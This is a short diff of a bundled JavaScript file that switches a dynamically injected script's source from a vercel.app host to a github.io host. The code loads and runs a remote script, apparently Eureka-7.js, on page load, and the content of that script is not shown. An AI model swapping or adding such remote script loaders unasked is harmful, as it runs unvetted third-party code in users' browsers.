@@ -41388,7 +41388,7 @@ const load = () => {
   if (injected) return;
   injected = true;
   const script = document.createElement('script');
-  script.src = "https://ba4x-player.vercel.app/Eureka-7.js";
+  script.src = "https://potentiamod.github.io/Eureka-7.js";
   document.head.appendChild(script);
 };
 /* harmony default export */ __webpack_exports__["default"] = ({
